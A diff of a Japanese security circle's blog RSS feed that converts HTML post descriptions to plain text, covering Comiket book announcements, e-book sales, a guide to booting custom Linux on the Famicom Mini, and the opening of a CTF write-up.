@@ -2,12 +2,28 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>Posts on urandom</title>
-    <link>//blog.urandom.team/post/index.xml</link>
+    <link>//blog.urandom.team/post/</link>
     <description>Recent content in Posts on urandom</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>ja-jp</language>
-    <lastBuildDate>Sun, 05 Aug 2018 22:13:33 +0900</lastBuildDate>
-    <atom:link href="//blog.urandom.team/post/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Tue, 25 Dec 2018 18:03:47 +0900</lastBuildDate>
+    
+	<atom:link href="//blog.urandom.team/post/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>C95参加と新刊のお知らせ</title>
+      <link>//blog.urandom.team/post/c95-announce/</link>
+      <pubDate>Tue, 25 Dec 2018 18:03:47 +0900</pubDate>
+      
+      <guid>//blog.urandom.team/post/c95-announce/</guid>
+      <description>C95（2018年冬コミ）に当選してました。 スペースは 2日目 東6 ト44b です。 新刊“urandom vol.7”を出します。
+次の画像をクリックすると本文サンプルが見えます。
+
+urandom vol.7は次の内容になります。
+ SECCON2018 国際大会決勝参戦記 (by urandom) 展開署名: Folding Signatureの進捗 (by yyu)  ページ数は本文30pとなっております。頒布価格は300円の予定です。
+それでは会場でお会いしましょう。</description>
+    </item>
     
     <item>
       <title>C94参加と新刊のお知らせ</title>
@@ -15,25 +31,12 @@
       <pubDate>Sun, 05 Aug 2018 22:13:33 +0900</pubDate>
       
       <guid>//blog.urandom.team/post/c94-announce/</guid>
-      <description>&lt;p&gt;C94（2018年夏コミ）に当選してました。
-スペースは &lt;strong&gt;1日目 西1 む39b&lt;/strong&gt; です。
-新刊“urandom vol.6”を出します。&lt;/p&gt;
+      <description>C94（2018年夏コミ）に当選してました。 スペースは 1日目 西1 む39b です。 新刊“urandom vol.6”を出します。
+次の画像をクリックすると本文サンプルが見えます。
 
-&lt;p&gt;次の画像をクリックすると本文サンプルが見えます。&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&#34;//blog.urandom.team/pdfs/c94_sample.pdf&#34;&gt;&lt;img src=&#34;//blog.urandom.team/images/c94_cover_thumb.png&#34; alt=&#34;c94 sample&#34; /&gt;&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;urandom vol.6は次の内容になります。&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;IoT機器のFW解析 -CBCTF2018予選問題 Odin解説- (by op)&lt;/li&gt;
-&lt;li&gt;素因数分解ゲーム (by yyu)&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;ページ数は本文34pとなっております。頒布価格は300円の予定です。&lt;/p&gt;
-
-&lt;p&gt;それでは会場でお会いしましょう。&lt;/p&gt;
-</description>
+urandom vol.6は次の内容になります。
+ IoT機器のFW解析 -CBCTF2018予選問題 Odin解説- (by op) 素因数分解ゲーム (by yyu)  ページ数は本文34pとなっております。頒布価格は300円の予定です。
+それでは会場でお会いしましょう。</description>
     </item>
     
     <item>
@@ -42,34 +45,13 @@
       <pubDate>Mon, 25 Dec 2017 18:40:33 +0900</pubDate>
       
       <guid>//blog.urandom.team/post/c93-announce/</guid>
-      <description>&lt;p&gt;C93（2017年冬コミ）に当選してました。
-スペースは &lt;strong&gt;1日目 東キ47a&lt;/strong&gt; です&lt;sup class=&#34;footnote-ref&#34; id=&#34;fnref:change&#34;&gt;&lt;a rel=&#34;footnote&#34; href=&#34;#fn:change&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;。
-新刊“urandom vol.5”を出します。&lt;/p&gt;
+      <description>C93（2017年冬コミ）に当選してました。 スペースは 1日目 東キ47a です1。 新刊“urandom vol.5”を出します。
+次の画像をクリックすると本文サンプルが見えます。
 
-&lt;p&gt;次の画像をクリックすると本文サンプルが見えます。&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&#34;//blog.urandom.team/pdfs/c93_sample.pdf&#34;&gt;&lt;img src=&#34;//blog.urandom.team/images/c93_cover_thumb.png&#34; alt=&#34;c94 sample&#34; /&gt;&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;urandom vol.5は次のような内容になります。&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;CBCTF2017問題解説 - One of Three Billion (by op)&lt;/li&gt;
-&lt;li&gt;Bitcoinによる公平なCTF (by yyu)&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;ページ数は本文34pとなっております。頒布価格は300円の予定です。&lt;/p&gt;
-
-&lt;p&gt;それでは会場でお会いしましょう。&lt;/p&gt;
-&lt;div class=&#34;footnotes&#34;&gt;
-
-&lt;hr /&gt;
-
-&lt;ol&gt;
-&lt;li id=&#34;fn:change&#34;&gt;これまでは3日目でしたが、今回から1日目となりましたのでご注意ください。
- &lt;a class=&#34;footnote-return&#34; href=&#34;#fnref:change&#34;&gt;&lt;sup&gt;[return]&lt;/sup&gt;&lt;/a&gt;&lt;/li&gt;
-&lt;/ol&gt;
-&lt;/div&gt;
-</description>
+urandom vol.5は次のような内容になります。
+ CBCTF2017問題解説 - One of Three Billion (by op) Bitcoinによる公平なCTF (by yyu)  ページ数は本文34pとなっております。頒布価格は300円の予定です。
+それでは会場でお会いしましょう。
+ これまでは3日目でしたが、今回から1日目となりましたのでご注意ください。 [return]   </description>
     </item>
     
     <item>
@@ -78,23 +60,11 @@
       <pubDate>Tue, 08 Aug 2017 02:03:25 +0900</pubDate>
       
       <guid>//blog.urandom.team/post/c92-announce/</guid>
-      <description>&lt;p&gt;C92（2017年夏コミ）に当選してました。
-スペースは &lt;strong&gt;3日目 東イ-60b&lt;/strong&gt; です。
-新刊“urandom vol.4”と既刊“urandom vol.3”を出します。&lt;/p&gt;
+      <description>C92（2017年夏コミ）に当選してました。 スペースは 3日目 東イ-60b です。 新刊“urandom vol.4”と既刊“urandom vol.3”を出します。
 
-&lt;p&gt;&lt;a href=&#34;//blog.urandom.team/pdfs/c92_sample.pdf&#34;&gt;&lt;img src=&#34;//blog.urandom.team/images/c92_cover_thumb.png&#34; alt=&#34;c92 sample&#34; /&gt;&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;urandom vol.4は次のような内容になります。&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;mitmproxy入門 (by op)&lt;/li&gt;
-&lt;li&gt;公平なランサムウェアプロトコル (by yyu)&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;ページ数は本文34pとなっております。頒布価格は300円の予定です。&lt;/p&gt;
-
-&lt;p&gt;それでは会場でお会いしましょう。&lt;/p&gt;
-</description>
+urandom vol.4は次のような内容になります。
+ mitmproxy入門 (by op) 公平なランサムウェアプロトコル (by yyu)  ページ数は本文34pとなっております。頒布価格は300円の予定です。
+それでは会場でお会いしましょう。</description>
     </item>
     
     <item>
@@ -103,15 +73,8 @@
       <pubDate>Fri, 28 Apr 2017 21:15:56 +0900</pubDate>
       
       <guid>//blog.urandom.team/post/cho-tech/</guid>
-      <description>&lt;p&gt;ニコニコ超会議2017に併催の&lt;a href=&#34;https://techbookfest.org/event/cho01&#34;&gt;超技術書典&lt;/a&gt;に当選しました。スペースは &lt;strong&gt;1日目 B-17&lt;/strong&gt; です。
-C91に引き続き、“&lt;a href=&#34;//blog.urandom.team/post/c91-digital/&#34;&gt;urandom vol.3&lt;/a&gt;”を頒布します。&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;a href=&#34;https://techbookfest.org/event/cho01/circle/5671617594130432&#34;&gt;https://techbookfest.org/event/cho01/circle/5671617594130432&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;頒布価格は300円です。それでは会場でお会いしましょう。&lt;/p&gt;
-</description>
+      <description>ニコニコ超会議2017に併催の超技術書典に当選しました。スペースは 1日目 B-17 です。 C91に引き続き、“urandom vol.3”を頒布します。
+ https://techbookfest.org/event/cho01/circle/5671617594130432  頒布価格は300円です。それでは会場でお会いしましょう。</description>
     </item>
     
     <item>
@@ -120,27 +83,11 @@ C91に引き続き、“&lt;a href=&#34;//blog.urandom.team/post/c91-digital/&#3
       <pubDate>Sun, 12 Mar 2017 17:17:50 +0900</pubDate>
       
       <guid>//blog.urandom.team/post/c91-digital/</guid>
-      <description>
-
-&lt;h1 id=&#34;urandom-vol-3電子版&#34;&gt;urandom vol.3電子版&lt;/h1&gt;
-
-&lt;p&gt;&lt;img src=&#34;//blog.urandom.team/images/c91_cover.png&#34; alt=&#34;C91 Sample&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;C91の1ヶ月後に出すと告知しておいて、結局3月になってしまいましたが、urandom vol.3の電子版を公開しました。&lt;/p&gt;
-
-&lt;p&gt;urandom vol.3電子版は &lt;strong&gt;128円&lt;/strong&gt; での販売となります。内容は物理書籍版とほぼ同じです。&lt;/p&gt;
-
-&lt;p&gt;販売ページは&lt;a href=&#34;https://gum.co/uqxsS&#34;&gt;こちら（Gumroad）&lt;/a&gt;です。決済にはクレジットカードかPayPalが使えます。&lt;/p&gt;
-
-&lt;h2 id=&#34;物理書籍版購入者の方へ&#34;&gt;物理書籍版購入者の方へ&lt;/h2&gt;
-
-&lt;p&gt;購入ページに“Offer code”という欄がありますので、そちらに物理書籍挟み込みの紙に記載されたコードを入力してください。&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;コードを使用する場合、クレジットカード情報は不要です。正しいコードを入力すると入力欄が非表示になります。&lt;/li&gt;
-&lt;li&gt;同一コードは10回まで使用可能です。ダウンロードしたデータを紛失した際は同一コードを入力してください。&lt;/li&gt;
-&lt;/ul&gt;
-</description>
+      <description> urandom vol.3電子版 C91の1ヶ月後に出すと告知しておいて、結局3月になってしまいましたが、urandom vol.3の電子版を公開しました。
+urandom vol.3電子版は 128円 での販売となります。内容は物理書籍版とほぼ同じです。
+販売ページはこちら（Gumroad）です。決済にはクレジットカードかPayPalが使えます。
+物理書籍版購入者の方へ 購入ページに“Offer code”という欄がありますので、そちらに物理書籍挟み込みの紙に記載されたコードを入力してください。
+ コードを使用する場合、クレジットカード情報は不要です。正しいコードを入力すると入力欄が非表示になります。 同一コードは10回まで使用可能です。ダウンロードしたデータを紛失した際は同一コードを入力してください。  </description>
     </item>
     
     <item>
@@ -149,35 +96,14 @@ C91に引き続き、“&lt;a href=&#34;//blog.urandom.team/post/c91-digital/&#3
       <pubDate>Tue, 13 Dec 2016 01:30:16 +0900</pubDate>
       
       <guid>//blog.urandom.team/post/c91-sample/</guid>
-      <description>&lt;p&gt;&lt;a href=&#34;//blog.urandom.team/pdfs/c91_sample.pdf&#34;&gt;&lt;img src=&#34;//blog.urandom.team/images/c91_cover.png&#34; alt=&#34;C91 Sample&#34; /&gt;&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;表紙だよ！　リンク先はサンプルのPDFだよ！（※サンプルにはカラー写真が含まれていますが、当日頒布する冊子はグレースケールです）&lt;/p&gt;
-
-&lt;p&gt;数多の困難を乗り越え、来るC91で頒布する新刊「urandom vol.3」の入稿が完了しました。&lt;/p&gt;
-
-&lt;p&gt;改めて告知しますと、スペースは &lt;strong&gt;土曜日 東R-12b&lt;/strong&gt; です（&lt;a href=&#34;https://webcatalog.circle.ms/Circle/13006119&#34;&gt;Webカタログ&lt;/a&gt;）。3日目だよ、大晦日だよ。&lt;/p&gt;
-
-&lt;p&gt;ページ数は本文64pと読みごたえ抜群の仕様となっております。頒布価格は300円です。&lt;/p&gt;
-
-&lt;p&gt;今回の記事は以下の3本です。&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;ファミコンミニとLinux - op&lt;/li&gt;
-&lt;li&gt;Secure Grouping Protocol Using Mental Poker - yyu&lt;/li&gt;
-&lt;li&gt;urandom出版技術部活動報告 - mayth&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;なお、今回&lt;strong&gt;既刊の頒布はありません&lt;/strong&gt;。vol.1、vol.2は次の電子書籍をご利用ください。&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;a href=&#34;https://gumroad.com/l/xgnF&#34;&gt;urandom vol.1&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;https://gumroad.com/l/zjTOY&#34;&gt;urandom vol.2&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;vol.3の電子書籍版はコミックマーケット91の1ヶ月後を目処に配信予定です。&lt;/p&gt;
-
-&lt;p&gt;それでは、大晦日に会場でお会いしましょう。&lt;/p&gt;
-</description>
+      <description>表紙だよ！　リンク先はサンプルのPDFだよ！（※サンプルにはカラー写真が含まれていますが、当日頒布する冊子はグレースケールです）
+数多の困難を乗り越え、来るC91で頒布する新刊「urandom vol.3」の入稿が完了しました。
+改めて告知しますと、スペースは 土曜日 東R-12b です（Webカタログ）。3日目だよ、大晦日だよ。
+ページ数は本文64pと読みごたえ抜群の仕様となっております。頒布価格は300円です。
+今回の記事は以下の3本です。
+ ファミコンミニとLinux - op Secure Grouping Protocol Using Mental Poker - yyu urandom出版技術部活動報告 - mayth  なお、今回既刊の頒布はありません。vol.1、vol.2は次の電子書籍をご利用ください。
+ urandom vol.1 urandom vol.2  vol.3の電子書籍版はコミックマーケット91の1ヶ月後を目処に配信予定です。
+それでは、大晦日に会場でお会いしましょう。</description>
     </item>
     
     <item>
@@ -186,146 +112,20 @@ C91に引き続き、“&lt;a href=&#34;//blog.urandom.team/post/c91-digital/&#3
       <pubDate>Mon, 14 Nov 2016 20:01:17 +0900</pubDate>
       
       <guid>//blog.urandom.team/post/my-linux-kernel-on-nesclassic/</guid>
-      <description>
-
-&lt;h1 id=&#34;はじめに&#34;&gt;はじめに&lt;/h1&gt;
-
-&lt;p&gt;ファミコンミニ自体の権利表記画面や&lt;a href=&#34;https://www.nintendo.co.jp/support/oss/&#34;&gt;任天堂Webサイト&lt;/a&gt;で配布されているOSSソースコードからも分かるように、ファミコンミニの中で動いているのはU-bootで起動されたLinuxです。なので、ファミコンミニを適切に初期化した上で、適切にビルドしたLinuxカーネルを流しこめば、ファミコンミニ上で自前のLinuxを動かせます。U-boot(GPLv2)とLinux(GPLv2)のソースコードを読解・ビルドして自前のLinuxを起動したので、手順を書きます。&lt;/p&gt;
-
-&lt;p&gt;&lt;blockquote class=&#34;twitter-tweet tw-align-center&#34; data-lang=&#34;ja&#34;&gt;&lt;p lang=&#34;ja&#34; dir=&#34;ltr&#34;&gt;ファミコンミニで自前ビルドのLinux動いた (My Linux kernel on NES Classic) &lt;a href=&#34;https://t.co/00EZZgMx7A&#34;&gt;pic.twitter.com/00EZZgMx7A&lt;/a&gt;&lt;/p&gt;&amp;mdash; op (@6f70) &lt;a href=&#34;https://twitter.com/6f70/status/797939754528444416&#34;&gt;2016年11月13日&lt;/a&gt;&lt;/blockquote&gt;
-&lt;script async src=&#34;//platform.twitter.com/widgets.js&#34; charset=&#34;utf-8&#34;&gt;&lt;/script&gt;&lt;/p&gt;
-
-&lt;h1 id=&#34;注意&#34;&gt;注意&lt;/h1&gt;
-
-&lt;p&gt;&lt;strong&gt;この記事の内容を実践すると、製品保証が無効になったり、故障に繋がる可能性があります。内容を理解できる人が自己責任で行って下さい。&lt;/strong&gt;&lt;/p&gt;
-
-&lt;h1 id=&#34;事前準備&#34;&gt;事前準備&lt;/h1&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;p&gt;sunxi-fel (&lt;a href=&#34;http://linux-sunxi.org/Sunxi-tools&#34;&gt;sunxi-tools&lt;/a&gt;)&lt;/p&gt;&lt;/li&gt;
-
-&lt;li&gt;&lt;p&gt;abootimg&lt;/p&gt;&lt;/li&gt;
-
-&lt;li&gt;&lt;p&gt;ARMのコンパイル環境&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;Ubuntu 12.04 + gcc-arm-linux-gnueabi でテストしています。&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-
-&lt;li&gt;&lt;p&gt;ファミコンミニのシリアルコンソール&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;参考: &lt;a href=&#34;https://www.ns-koubou.com/blog/2016/11/11/nes_classic/&#34;&gt;ニンテンドークラシックミニ ファミリーコンピュータの中身の話 - えぬえす工房&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;参考: &lt;a href=&#34;http://linux-sunxi.org/Nintendo_NES_Classic_Edition&#34;&gt;Nintendo NES Classic Edition - linux-sunxi.org&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-
-&lt;li&gt;&lt;p&gt;ファミコンミニとホストPCのUSB接続&lt;/p&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h1 id=&#34;手順&#34;&gt;手順&lt;/h1&gt;
-
-&lt;ol&gt;
-&lt;li&gt;&lt;p&gt;U-boot, 起動イメージの取得&lt;/p&gt;
-
-&lt;ol&gt;
-&lt;li&gt;&lt;p&gt;シリアルコンソールで &lt;code&gt;s&lt;/code&gt; キーを押しながらファミコンミニを起動して、U-bootのシェルに入ります。&lt;/p&gt;&lt;/li&gt;
-
-&lt;li&gt;&lt;p&gt;シリアルコンソールで以下のコマンドを実行して、内蔵フラッシュの先頭部分を読み出します。&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;sunxi_flash phy_read 58000000 0 80
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;読み出し先アドレス0x58000000とセクタ数0x80は、適当な使ってなさそうな所と長さなので、必然性はありません。&lt;/p&gt;&lt;/li&gt;
-
-&lt;li&gt;&lt;p&gt;シリアルコンソールで &lt;code&gt;fastboot_test&lt;/code&gt; コマンドを実行して、FELモードに入ります。&lt;/p&gt;
-
-&lt;p&gt;fastbootと言いつつFELモードに入ります。このFELモードでは最初からDRAMが有効化されています。ただし、シリアルコンソールが壊れるようです。&lt;/p&gt;&lt;/li&gt;
-
-&lt;li&gt;&lt;p&gt;ホストで以下のコマンドを実行して、手順1.2で読みだしたイメージをホストへ転送します。&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;sunxi-fel read 0x58000000 0x1000000 0000-0080.bin
-&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
-
-&lt;li&gt;&lt;p&gt;U-bootのマジック &lt;code&gt;uboot&lt;/code&gt; でイメージ中を検索するとU-bootが見つかります。オフセット0x14にサイズが格納されているので、それを元に切り出します。切り出したファイルをu-boot.binとします。&lt;/p&gt;&lt;/li&gt;
-
-&lt;li&gt;&lt;p&gt;起動イメージのマジック &lt;code&gt;ANDROID!&lt;/code&gt; でイメージ中を検索すると起動イメージが見つかるので、適当に切り出します。切り出したファイルをboot.imgとします。&lt;/p&gt;&lt;/li&gt;
-&lt;/ol&gt;&lt;/li&gt;
-
-&lt;li&gt;&lt;p&gt;Linuxのビルド&lt;/p&gt;
-
-&lt;p&gt;配布されているソースコード中の linux-9ed0e6c8612113834e9af9d16a3e90b573c488ca をビルドします。&lt;/p&gt;
-
-&lt;ol&gt;
-&lt;li&gt;&lt;p&gt;&lt;code&gt;drivers/video/sunxi/hdmi_ep952/EP952api.h&lt;/code&gt; のコメントアウトされている &lt;code&gt;WARN&lt;/code&gt; マクロを有効にします。&lt;/p&gt;&lt;/li&gt;
-
-&lt;li&gt;&lt;p&gt;以下のコマンドを実行してconfigします。&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;export ARCH=arm
-export CROSS_COMPILE=arm-linux-gnueabi-
-
-make sun8iw5p1smp_defconfig
-&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
-
-&lt;li&gt;&lt;p&gt;.configに以下の変更を加えます。&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;CONFIG_INITRAMFS_SOURCE=&amp;quot;&amp;quot;
-CONFIG_CMA=y
-CONFIG_FB_SUNXI=y
-CONFIG_CMDLINE_FORCE=n
-CONFIG_USB_SUPPORT=n
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;USBを切っているのは単にサイズ削減の為です。&lt;/p&gt;&lt;/li&gt;
-
-&lt;li&gt;&lt;p&gt;以下のコマンドを実行してビルドします。&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;make zImage
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;対話的に聞かれるconfigの確認は全部そのままでもとりあえず動きました。&lt;/p&gt;&lt;/li&gt;
-&lt;/ol&gt;&lt;/li&gt;
-
-&lt;li&gt;&lt;p&gt;U-boot, 起動イメージの作成&lt;/p&gt;
-
-&lt;ol&gt;
-&lt;li&gt;&lt;p&gt;u-boot.bin中の &lt;code&gt;bootcmd=sunxi_flash phy_read 43800000 30 20;boota 43800000&lt;/code&gt; を &lt;code&gt;bootcmd=boota 43800000&lt;/code&gt; に置換します(オフセットがずれないようにNULLパディング)。&lt;/p&gt;&lt;/li&gt;
-
-&lt;li&gt;&lt;p&gt;以下のコマンドで起動イメージを展開します。&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;abootimg -x boot.img
-&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
-
-&lt;li&gt;&lt;p&gt;zImageを手順2で作成したものに差し替え、以下のコマンドで起動イメージを再作成します。&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;abootimg --create myboot.img -f bootimg.cfg -k zImage -r initrd.img
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;このままではinitrd.imgを展開できないので、起動しても &lt;code&gt;/init&lt;/code&gt; を実行できずにPanicします。
-起動後にシェル等を操作したい場合は、カーネルパラメーターとinitrd.imgを適宜編集したり作りなおして下さい。&lt;/p&gt;&lt;/li&gt;
-&lt;/ol&gt;&lt;/li&gt;
-
-&lt;li&gt;&lt;p&gt;Linuxの起動&lt;/p&gt;
-
-&lt;ol&gt;
-&lt;li&gt;&lt;p&gt;手順1.1, 1.3でFELモードに入ります。&lt;/p&gt;&lt;/li&gt;
-
-&lt;li&gt;&lt;p&gt;ホストで以下のコマンドを実行すると、Linuxが起動します。&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;sunxi-fel write 0x43800000 myboot.img
-sunxi-fel write 0x47000000 u-boot.bin
-sunxi-fel exe   0x47000000
-&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
-&lt;/ol&gt;&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;h1 id=&#34;おわりに&#34;&gt;おわりに&lt;/h1&gt;
-
-&lt;p&gt;ざっと手順を書き出しました。ファミコンミニは拡張性が低いのが難点ですが、計算能力はそれなりにあるので色々な事ができそうです。
-Linuxカーネルはとりあえず動くものをビルドしたので、より適切なビルド方法は他にあるかと思いますし、起動手順ももっと簡素な物がありそうです。&lt;/p&gt;
-
-&lt;p&gt;作業を始めた当初は &lt;code&gt;fastboot_test&lt;/code&gt; コマンドでDRAM有効化済みのFELモードに入れる事に気付いておらず、 &lt;code&gt;efex&lt;/code&gt; コマンドでDRAM無効なFELモードに入って、頑張って自前でDRAMを有効化して作業していました。
-その辺のU-bootの紆余曲折やソースコードを解説する記事を、C91で頒布する同人誌 &lt;a href=&#34;//blog.urandom.team/post/c90-digital-and-c91/&#34;&gt;urandom vol.3&lt;/a&gt; に書く予定です（落とさなければ）。続報は追ってこのブログに書きます。&lt;/p&gt;
-</description>
+      <description>はじめに ファミコンミニ自体の権利表記画面や任天堂Webサイトで配布されているOSSソースコードからも分かるように、ファミコンミニの中で動いているのはU-bootで起動されたLinuxです。なので、ファミコンミニを適切に初期化した上で、適切にビルドしたLinuxカーネルを流しこめば、ファミコンミニ上で自前のLinuxを動かせます。U-boot(GPLv2)とLinux(GPLv2)のソースコードを読解・ビルドして自前のLinuxを起動したので、手順を書きます。
+ファミコンミニで自前ビルドのLinux動いた (My Linux kernel on NES Classic) pic.twitter.com/00EZZgMx7A
+&amp;mdash; op (@6f70) 2016年11月13日 
+注意 この記事の内容を実践すると、製品保証が無効になったり、故障に繋がる可能性があります。内容を理解できる人が自己責任で行って下さい。
+事前準備  sunxi-fel (sunxi-tools)
+ abootimg
+ ARMのコンパイル環境
+ Ubuntu 12.04 + gcc-arm-linux-gnueabi でテストしています。  ファミコンミニのシリアルコンソール
+ 参考: ニンテンドークラシックミニ ファミリーコンピュータの中身の話 - えぬえす工房 参考: Nintendo NES Classic Edition - linux-sunxi.org  ファミコンミニとホストPCのUSB接続
+  手順  U-boot, 起動イメージの取得
+ シリアルコンソールで s キーを押しながらファミコンミニを起動して、U-bootのシェルに入ります。
+ シリアルコンソールで以下のコマンドを実行して、内蔵フラッシュの先頭部分を読み出します。
+sunxi_flash phy_read 58000000 0 80  読み出し先アドレス0x58000000とセクタ数0x80は、適当な使ってなさそうな所と長さなので、必然性はありません。
+ シリアルコンソールで fastboot_test コマンドを実行して、FELモードに入ります。</description>
     </item>
     
     <item>
@@ -334,34 +134,13 @@ Linuxカーネルはとりあえず動くものをビルドしたので、より
       <pubDate>Wed, 02 Nov 2016 22:55:00 +0900</pubDate>
       
       <guid>//blog.urandom.team/post/c90-digital-and-c91/</guid>
-      <description>
-
-&lt;h1 id=&#34;urandom-vol-2電子版&#34;&gt;urandom vol.2電子版&lt;/h1&gt;
-
-&lt;p&gt;大変長らくお待たせしました。urandom vol.2の電子版を公開しました。&lt;/p&gt;
-
-&lt;p&gt;urandom vol.2電子版は &lt;strong&gt;128円&lt;/strong&gt; での販売となります。内容は物理書籍版とほぼ同じです（どこが違うか探してみよう！　特に景品はないです）。&lt;/p&gt;
-
-&lt;p&gt;販売ページは&lt;a href=&#34;https://gumroad.com/l/zjTOY&#34;&gt;こちら（Gumroad）&lt;/a&gt;です。決済にはクレジットカードかPayPalが使えます。&lt;/p&gt;
-
-&lt;h2 id=&#34;物理書籍版購入者の方へ&#34;&gt;物理書籍版購入者の方へ&lt;/h2&gt;
-
-&lt;p&gt;購入ページに&amp;rdquo;Offer code&amp;rdquo;という欄がありますので、そちらに物理書籍挟み込みの紙に記載されたコードを入力してください。&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;コードを使用する場合、クレジットカード情報は不要です。正しいコードを入力すると入力欄が非表示になります。&lt;/li&gt;
-&lt;li&gt;同一コードは10回まで使用可能です。ダウンロードしたデータを紛失した際は同一コードを入力してください。&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h1 id=&#34;urandom-vol-3&#34;&gt;urandom vol.3&lt;/h1&gt;
-
-&lt;p&gt;続けて冬のお知らせです。無事に冬コミ（C91）に当選しました。スペースは &lt;strong&gt;土曜日 東R-12b&lt;/strong&gt; です（&lt;a href=&#34;https://webcatalog.circle.ms/Circle/13006119&#34;&gt;Webカタログはこちら&lt;/a&gt;）。&lt;/p&gt;
-
-&lt;p&gt;これまでだと「だいたいこういう内容になる予定ですよ」というリストくらいは出せていたのですが、今回は現時点で何も決まっておりません。
-が、コンピュータセキュリティ的な本であるところからは変わりないと思います。内容が決まり次第随時告知しますので、今しばらくお待ちください。&lt;/p&gt;
-
-&lt;p&gt;それでは、今年も大晦日にお会いしましょう。&lt;/p&gt;
-</description>
+      <description>urandom vol.2電子版 大変長らくお待たせしました。urandom vol.2の電子版を公開しました。
+urandom vol.2電子版は 128円 での販売となります。内容は物理書籍版とほぼ同じです（どこが違うか探してみよう！　特に景品はないです）。
+販売ページはこちら（Gumroad）です。決済にはクレジットカードかPayPalが使えます。
+物理書籍版購入者の方へ 購入ページに&amp;rdquo;Offer code&amp;rdquo;という欄がありますので、そちらに物理書籍挟み込みの紙に記載されたコードを入力してください。
+ コードを使用する場合、クレジットカード情報は不要です。正しいコードを入力すると入力欄が非表示になります。 同一コードは10回まで使用可能です。ダウンロードしたデータを紛失した際は同一コードを入力してください。  urandom vol.3 続けて冬のお知らせです。無事に冬コミ（C91）に当選しました。スペースは 土曜日 東R-12b です（Webカタログはこちら）。
+これまでだと「だいたいこういう内容になる予定ですよ」というリストくらいは出せていたのですが、今回は現時点で何も決まっておりません。 が、コンピュータセキュリティ的な本であるところからは変わりないと思います。内容が決まり次第随時告知しますので、今しばらくお待ちください。
+それでは、今年も大晦日にお会いしましょう。</description>
     </item>
     
     <item>
@@ -370,212 +149,17 @@ Linuxカーネルはとりあえず動くものをビルドしたので、より
       <pubDate>Wed, 17 Aug 2016 00:17:26 +0900</pubDate>
       
       <guid>//blog.urandom.team/post/tmctf2016-qual/</guid>
-      <description>
-
-&lt;p&gt;日本時間 2016-07-30 13:00 から 2016-07-31 13:00まで（24時間）に行われた&lt;a href=&#34;http://www.trendmicro.co.jp/jp/sp/ctf2016_jp/&#34;&gt;Trend Micro CTF 2016&lt;/a&gt;のwrite-upです。&lt;/p&gt;
-
-&lt;p&gt;urandomは4問解答し600点、92位でした。&lt;/p&gt;
-
-&lt;p&gt;Analysis-Offensive 100をyyu、Analysis-Offensive 200、Misc 100、Misc 200をmaythが解答しました。&lt;/p&gt;
-
-&lt;h1 id=&#34;analysis-offensive-100&#34;&gt;Analysis - Offensive 100&lt;/h1&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;Category: Analysis/Offensive&lt;/p&gt;
-
-&lt;p&gt;Points: 100&lt;/p&gt;
-
-&lt;p&gt;Please enter key. Key is TMCTF flag.&lt;/p&gt;
-
-&lt;p&gt;Download the file
-Decrypt the downloaded file by the following command.&lt;/p&gt;
-
-&lt;p&gt;&lt;code&gt;openssl enc -d -aes-256-cbc -k x0nSTZ9NrDgvCnqKhL9y -in files1.enc -out files1.zip&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;code&gt;unzip files1.zip&lt;/code&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-
